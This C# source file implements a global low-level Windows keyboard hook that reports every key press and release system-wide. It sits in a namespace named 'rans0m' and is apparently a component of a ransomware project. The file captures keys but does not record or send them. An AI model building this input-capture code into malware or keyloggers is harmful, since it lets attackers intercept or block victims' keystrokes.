using System.Diagnostics;
using System.Runtime.InteropServices;

namespace rans0m
{
    public class KeyboardHook : IDisposable
    {
        private const int WH_KEYBOARD_LL = 13;

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        private LowLevelKeyboardProc _proc;
        private IntPtr _hookID = IntPtr.Zero;

        public event Action<Keys>? KeyPressed;
        public event Action<Keys>? KeyReleased;

        public void Hook()
        {
            _proc = HookCallback;

            using (Process curProcess = Process.GetCurrentProcess())
            {
                IntPtr moduleHandle = GetModuleHandle(curProcess.MainModule?.ModuleName);
                _hookID = SetWindowsHookEx(WH_KEYBOARD_LL, _proc, moduleHandle, 0);
            }

            if (_hookID == IntPtr.Zero)
                throw new InvalidOperationException(
                    $"SetWindowsHookEx failed. Error: {Marshal.GetLastWin32Error()}");
        }

        public void Unhook()
        {
            if (_hookID != IntPtr.Zero)
            {
                UnhookWindowsHookEx(_hookID);
                _hookID = IntPtr.Zero;
            }
        }

        public void Dispose()
        {
            Unhook();
            GC.SuppressFinalize(this);
        }

        ~KeyboardHook()
        {
            Unhook();
        }

        private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                Keys key = (Keys)vkCode;

                switch (wParam.ToInt32())
                {
                    case 256: // WM_KEYDOWN
                    case 260: // WM_SYSKEYDOWN
                        KeyPressed?.Invoke(key);
                        break;
                    case 257: // WM_KEYUP
                    case 261: // WM_SYSKEYUP
                        KeyReleased?.Invoke(key);
                        break;
                }
            }

            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        // DllImports
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn,
            IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
    }
}